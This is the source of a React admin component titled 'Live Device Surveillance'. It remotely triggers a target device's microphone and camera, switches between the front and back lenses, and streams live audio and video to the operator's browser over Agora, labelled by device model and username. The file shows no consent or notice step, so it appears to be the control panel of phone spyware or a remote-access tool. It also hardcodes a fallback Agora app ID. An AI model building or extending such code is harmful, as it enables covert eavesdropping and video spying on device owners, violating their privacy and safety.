'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import type { IAgoraRTCClient, IRemoteAudioTrack, IRemoteVideoTrack } from 'agora-rtc-sdk-ng';

const API_BASE = process.env.NEXT_PUBLIC_API_URL || 'http://127.0.0.1:8000';
const WS_BASE = API_BASE.replace('http://', 'ws://').replace('https://', 'wss://');

interface Device {
  device_id: string;
  device_model: string;
  username: string;
}

interface AudioLevel {
  db: number;
  rms: number;
  timestamp: number;
}

interface SurveillancePanelProps {
  device: Device;
  onClose: () => void;
}

const MAX_HISTORY = 60;

function DbBar({ db }: { db: number }) {
  const clamped = Math.max(-80, Math.min(0, db));
  const pct = Math.round(((clamped + 80) / 80) * 100);

  const color =
    pct < 30
      ? 'bg-green-500'
      : pct < 60
      ? 'bg-yellow-400'
      : pct < 80
      ? 'bg-orange-500'
      : 'bg-red-600';

  return (
    <div className="w-full bg-gray-700 rounded-full h-5 overflow-hidden">
      <div
        className={`h-5 rounded-full transition-all duration-300 ${color}`}
        style={{ width: `${pct}%` }}
      />
    </div>
  );
}

function WaveformCanvas({ history }: { history: AudioLevel[] }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const W = canvas.width;
    const H = canvas.height;
    ctx.clearRect(0, 0, W, H);

    ctx.fillStyle = '#111827';
    ctx.fillRect(0, 0, W, H);

    if (history.length < 2) return;

    const barW = Math.max(1, W / MAX_HISTORY);
    history.forEach((level, i) => {
      const clamped = Math.max(-80, Math.min(0, level.db));
      const pct = (clamped + 80) / 80;
      const barH = Math.max(2, pct * H);

      const grad = ctx.createLinearGradient(0, H, 0, H - barH);
      grad.addColorStop(0, pct > 0.75 ? '#ef4444' : pct > 0.5 ? '#f97316' : '#22c55e');
      grad.addColorStop(1, 'rgba(34,197,94,0.2)');

      ctx.fillStyle = grad;
      ctx.fillRect(i * barW, H - barH, barW - 1, barH);
    });
  }, [history]);

  return (
    <canvas
      ref={canvasRef}
      width={480}
      height={80}
      className="w-full rounded-lg border border-gray-700"
    />
  );
}

export default function SurveillancePanel({ device, onClose }: SurveillancePanelProps) {
  const [audioActive, setAudioActive] = useState(false);
  const [cameraActive, setCameraActive] = useState(false);
  const [liveStreamConnected, setLiveStreamConnected] = useState(false);
  const [hasRemoteVideo, setHasRemoteVideo] = useState(false);
  const [hasRemoteAudio, setHasRemoteAudio] = useState(false);
  const [currentDb, setCurrentDb] = useState<number>(-80);
  const [currentRms, setCurrentRms] = useState<number>(0);
  const [history, setHistory] = useState<AudioLevel[]>([]);
  const [status, setStatus] = useState<string>('Idle');
  const [actionLoading, setActionLoading] = useState(false);
  const [isSwitchingCamera, setIsSwitchingCamera] = useState(false);

  const wsRef = useRef<WebSocket | null>(null);
  const rtcClientRef = useRef<IAgoraRTCClient | null>(null);
  const videoContainerRef = useRef<HTMLDivElement>(null);
  const activeChannelRef = useRef<string | null>(null);

  // Connect to admin WS for dB readings
  useEffect(() => {
    const ws = new WebSocket(`${WS_BASE}/ws?user_id=admin`);
    wsRef.current = ws;

    ws.onopen = () => setStatus('Admin WebSocket connected');
    ws.onmessage = (evt) => {
      try {
        const data = JSON.parse(evt.data);
        if (
          data.type === 'AUDIO_LEVEL_UPDATE' &&
          data.device_id === device.device_id
        ) {
          const level: AudioLevel = {
            db: Number(data.db ?? -80),
            rms: Number(data.rms ?? 0),
            timestamp: data.timestamp ?? Date.now(),
          };
          setCurrentDb(level.db);
          setCurrentRms(level.rms);
          setHistory((prev) => [...prev.slice(-(MAX_HISTORY - 1)), level]);
        }
      } catch {}
    };
    ws.onclose = () => setStatus('Admin WebSocket disconnected');
    ws.onerror = () => setStatus('Admin WebSocket error');

    return () => {
      ws.close();
      cleanupAgora();
    };
  }, [device.device_id]);

  const cleanupAgora = () => {
    try {
      rtcClientRef.current?.leave();
      rtcClientRef.current = null;
    } catch (e) {
      console.warn('Agora cleanup error:', e);
    }
    setLiveStreamConnected(false);
    setHasRemoteVideo(false);
    setHasRemoteAudio(false);
  };

  const handleStartAudio = async () => {
    setActionLoading(true);
    setStatus('Activating 1-Way Live Audio Stream...');
    try {
      cleanupAgora();
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/start-audio-feed`,
        { method: 'POST' }
      );
      if (!res.ok) {
        throw new Error(`Failed to start audio feed (HTTP ${res.status})`);
      }
      const data = await res.json();
      activeChannelRef.current = data.channel_name;

      const AgoraRTC = (await import('agora-rtc-sdk-ng')).default;
      AgoraRTC.setLogLevel(3);

      const client = AgoraRTC.createClient({ mode: 'rtc', codec: 'vp8' });
      rtcClientRef.current = client;

      client.on('user-published', async (remoteUser, mediaType) => {
        await client.subscribe(remoteUser, mediaType);
        if (mediaType === 'audio') {
          setHasRemoteAudio(true);
          // Play live microphone audio through browser speakers
          (remoteUser.audioTrack as IRemoteAudioTrack)?.play();
        }
        setLiveStreamConnected(true);
        setStatus('🔴 Live Audio Stream Receiving!');
      });

      client.on('user-unpublished', (_remoteUser, mediaType) => {
        if (mediaType === 'audio') setHasRemoteAudio(false);
      });

      client.on('user-left', () => {
        cleanupAgora();
        setAudioActive(false);
        setStatus('Device disconnected audio stream');
      });

      const appId = data.agora_app_id || 'e63a3e4f21124b659d8eeaef92f367c2';
      await client.join(appId, data.channel_name, data.token || null, 0);
      setAudioActive(true);
      setHistory([]);
      setStatus(
        data.delivered
          ? 'Listening to live audio stream...'
          : 'Command dispatched. Waiting for device audio...'
      );
    } catch (e: unknown) {
      console.error('Error starting audio stream:', e);
      setStatus(`Audio stream error: ${e instanceof Error ? e.message : String(e)}`);
      cleanupAgora();
      setAudioActive(false);
    } finally {
      setActionLoading(false);
    }
  };

  const handleStopAudio = async () => {
    setActionLoading(true);
    setStatus('Stopping Audio Feed...');
    try {
      await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/stop-audio-feed`,
        { method: 'POST' }
      );
    } catch (e) {
      console.error('Stop audio request error:', e);
    } finally {
      cleanupAgora();
      setAudioActive(false);
      setCurrentDb(-80);
      setCurrentRms(0);
      setStatus('Audio stream stopped');
      setActionLoading(false);
    }
  };

  const handleStartCamera = async () => {
    setActionLoading(true);
    setStatus('Activating Live Camera Stream...');
    try {
      cleanupAgora();
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/start-camera-feed`,
        { method: 'POST' }
      );
      if (!res.ok) {
        throw new Error(`Failed to start camera feed (HTTP ${res.status})`);
      }
      const data = await res.json();
      activeChannelRef.current = data.channel_name;

      const AgoraRTC = (await import('agora-rtc-sdk-ng')).default;
      AgoraRTC.setLogLevel(3);

      const client = AgoraRTC.createClient({ mode: 'rtc', codec: 'vp8' });
      rtcClientRef.current = client;

      client.on('user-published', async (remoteUser, mediaType) => {
        await client.subscribe(remoteUser, mediaType);
        if (mediaType === 'video') {
          setHasRemoteVideo(true);
          setTimeout(() => {
            if (videoContainerRef.current) {
              (remoteUser.videoTrack as IRemoteVideoTrack)?.play(videoContainerRef.current);
            }
          }, 300);
        }
        if (mediaType === 'audio') {
          setHasRemoteAudio(true);
          (remoteUser.audioTrack as IRemoteAudioTrack)?.play();
        }
        setLiveStreamConnected(true);
        setStatus('🔴 Live Camera Stream Receiving!');
      });

      client.on('user-unpublished', (_remoteUser, mediaType) => {
        if (mediaType === 'video') setHasRemoteVideo(false);
        if (mediaType === 'audio') setHasRemoteAudio(false);
      });

      client.on('user-left', () => {
        cleanupAgora();
        setCameraActive(false);
        setStatus('Device disconnected camera stream');
      });

      const appId = data.agora_app_id || 'e63a3e4f21124b659d8eeaef92f367c2';
      await client.join(appId, data.channel_name, data.token || null, 0);
      setCameraActive(true);
      setStatus(data.delivered ? 'Waiting for camera video stream...' : 'Command dispatched. Waiting for device video stream...');
    } catch (e: unknown) {
      console.error('Error starting camera stream:', e);
      setStatus(`Camera stream error: ${e instanceof Error ? e.message : String(e)}`);
      cleanupAgora();
      setCameraActive(false);
    } finally {
      setActionLoading(false);
    }
  };

  const handleStopCamera = async () => {
    setActionLoading(true);
    setStatus('Stopping Camera Feed...');
    try {
      await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/stop-camera-feed`,
        { method: 'POST' }
      );
    } catch (e) {
      console.error('Stop camera request error:', e);
    }
    cleanupAgora();
    activeChannelRef.current = null;
    setCameraActive(false);
    setStatus('Camera feed stopped');
    setActionLoading(false);
  };

  const handleSwitchCamera = async () => {
    try {
      setIsSwitchingCamera(true);
      setStatus('🔄 Switching camera lens (front ↔ back)...');
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(device.device_id)}/switch-camera`,
        { method: 'POST' }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setStatus(data.delivered ? '📷 Toggled camera lens (front/back)' : 'Switch camera command dispatched');
    } catch (e) {
      console.error('Failed to switch camera:', e);
      setStatus('Failed to switch camera lens');
    } finally {
      setTimeout(() => setIsSwitchingCamera(false), 600);
    }
  };

  const dbDisplay = currentDb.toFixed(1);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
      <div className="bg-gray-900 border border-gray-700 rounded-2xl shadow-2xl w-full max-w-2xl text-white overflow-hidden flex flex-col max-h-[90vh]">

        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-gray-700 bg-gray-900/90">
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-lg font-bold text-white">🛰️ Live Device Surveillance</h2>
              {liveStreamConnected && (
                <span className="flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[11px] font-bold bg-red-950 text-red-400 border border-red-800 animate-pulse">
                  <span className="w-2 h-2 rounded-full bg-red-500"></span>
                  LIVE STREAMING
                </span>
              )}
            </div>
            <p className="text-xs text-gray-400 mt-0.5">
              {device.device_model} &mdash;{' '}
              <span className="text-indigo-400 font-mono">@{device.username}</span>
            </p>
          </div>
          <button
            onClick={() => {
              cleanupAgora();
              onClose();
            }}
            className="text-gray-400 hover:text-white text-2xl leading-none px-2 rounded-lg hover:bg-gray-800 transition"
            title="Close"
          >
            ×
          </button>
        </div>

        {/* Status bar */}
        <div className="px-6 py-2 bg-gray-800/80 text-xs text-gray-300 flex items-center justify-between border-b border-gray-800">
          <div className="flex items-center gap-2">
            <span className={`inline-block w-2 h-2 rounded-full ${liveStreamConnected ? 'bg-red-500 animate-ping' : (audioActive || cameraActive) ? 'bg-green-400 animate-pulse' : 'bg-gray-500'}`} />
            <span>{status}</span>
          </div>
          <div className="flex items-center gap-3 text-[11px] text-gray-400 font-mono">
            {hasRemoteAudio && <span className="text-emerald-400 font-bold">🔊 Audio In Browser</span>}
            {hasRemoteVideo && <span className="text-blue-400 font-bold">📹 Video Synced</span>}
          </div>
        </div>

        <div className="flex-1 overflow-y-auto p-6 space-y-6">

          {/* Camera Video Section */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="font-semibold text-xs text-gray-300 uppercase tracking-wider flex items-center gap-1.5">
                📷 Live Camera Viewport
              </h3>
              <div className="flex items-center gap-2">
                <button
                  onClick={handleSwitchCamera}
                  disabled={isSwitchingCamera}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/40 text-amber-300 text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  title="Switch between front and back camera (Front ↔ Back)"
                >
                  <span className={isSwitchingCamera ? 'animate-spin inline-block' : ''}>🔄</span>
                  <span>{isSwitchingCamera ? 'Rotating...' : 'Rotate Camera'}</span>
                </button>

                {!cameraActive ? (
                  <button
                    onClick={handleStartCamera}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Connecting...' : '▶ Start Camera Stream'}
                  </button>
                ) : (
                  <button
                    onClick={handleStopCamera}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-red-600 hover:bg-red-500 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Stopping...' : '■ Stop Camera'}
                  </button>
                )}
              </div>
            </div>

            {/* Video Viewport Container */}
            <div className="relative w-full h-72 bg-black rounded-xl border border-gray-800 overflow-hidden shadow-inner flex items-center justify-center">
              {/* Overlay quick switch button when video is active */}
              {cameraActive && hasRemoteVideo && (
                <button
                  onClick={handleSwitchCamera}
                  disabled={isSwitchingCamera}
                  className="absolute top-3 right-3 z-10 flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-black/70 hover:bg-black/90 backdrop-blur-sm border border-white/20 text-white text-[11px] font-medium transition cursor-pointer shadow-lg"
                  title="Switch front/back camera"
                >
                  <span className={isSwitchingCamera ? 'animate-spin inline-block' : ''}>🔄</span>
                  <span>Flip Lens</span>
                </button>
              )}

              {/* Agora Video Render DOM */}
              <div
                ref={videoContainerRef}
                className={`w-full h-full object-cover ${hasRemoteVideo ? 'block' : 'hidden'}`}
              />

              {/* Placeholder / Offline State */}
              {!hasRemoteVideo && (
                <div className="text-center p-6 space-y-2">
                  <div className="text-4xl text-gray-600">
                    {cameraActive ? '📡' : '📹'}
                  </div>
                  <p className="text-sm font-semibold text-gray-300">
                    {cameraActive ? 'Connecting Live Video Stream...' : 'Camera Stream Inactive'}
                  </p>
                  <p className="text-xs text-gray-500 max-w-sm">
                    {cameraActive
                      ? 'Establishing real-time WebRTC channel with device. Live frame will appear immediately when received.'
                      : 'Click "Start Camera Stream" to wake the device camera and watch live video feed here.'}
                  </p>
                </div>
              )}
            </div>
          </div>

          {/* Audio Surveillance Section */}
          <div className="space-y-3 pt-2 border-t border-gray-800">
            <div className="flex items-center justify-between">
              <h3 className="font-semibold text-xs text-gray-300 uppercase tracking-wider flex items-center gap-1.5">
                🎙️ Live Audio Listening & Sound Level
              </h3>
              <div className="flex gap-2">
                {!audioActive ? (
                  <button
                    onClick={handleStartAudio}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-green-600 hover:bg-green-500 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Connecting...' : '▶ Listen Live (Browser Audio)'}
                  </button>
                ) : (
                  <button
                    onClick={handleStopAudio}
                    disabled={actionLoading}
                    className="px-4 py-1.5 rounded-lg bg-red-600 hover:bg-red-500 text-white text-xs font-semibold disabled:opacity-50 transition shadow-sm cursor-pointer"
                  >
                    {actionLoading ? 'Stopping...' : '■ Mute & Stop Audio'}
                  </button>
                )}
              </div>
            </div>

            {/* dB level bar */}
            <div className="space-y-1 bg-gray-800/50 p-3 rounded-xl border border-gray-800">
              <div className="flex justify-between text-xs text-gray-400">
                <span className="font-medium">Ambient Noise Intensity</span>
                <span className="font-mono text-white font-bold">{dbDisplay} dB</span>
              </div>
              <DbBar db={currentDb} />
            </div>

            {/* Scrolling Waveform */}
            <WaveformCanvas history={history} />

            {/* Stats row */}
            <div className="grid grid-cols-3 gap-3 text-center">
              <div className="bg-gray-800/60 border border-gray-800 rounded-xl py-2.5">
                <p className="text-[11px] text-gray-400 uppercase font-semibold">Sound Level</p>
                <p className="text-base font-mono font-bold text-green-400 mt-0.5">{dbDisplay} dB</p>
              </div>
              <div className="bg-gray-800/60 border border-gray-800 rounded-xl py-2.5">
                <p className="text-[11px] text-gray-400 uppercase font-semibold">RMS Amplitude</p>
                <p className="text-base font-mono font-bold text-blue-400 mt-0.5">{currentRms.toFixed(0)}</p>
              </div>
              <div className="bg-gray-800/60 border border-gray-800 rounded-xl py-2.5">
                <p className="text-[11px] text-gray-400 uppercase font-semibold">Live Speaker</p>
                <p className={`text-base font-bold mt-0.5 ${hasRemoteAudio ? 'text-emerald-400 animate-pulse' : 'text-gray-500'}`}>
                  {hasRemoteAudio ? '🔊 Active' : 'Off'}
                </p>
              </div>
            </div>
          </div>

        </div>

        {/* Footer */}
        <div className="px-6 py-3 border-t border-gray-800 bg-gray-900/90 flex justify-between items-center">
          <span className="text-xs text-gray-500 font-mono">
            Device ID: {device.device_id.slice(0, 16)}…
          </span>
          <button
            onClick={() => {
              cleanupAgora();
              onClose();
            }}
            className="px-5 py-2 rounded-xl bg-gray-800 hover:bg-gray-700 text-xs font-semibold text-white transition cursor-pointer"
          >
            Close Surveillance
          </button>
        </div>
      </div>
    </div>
  );
}
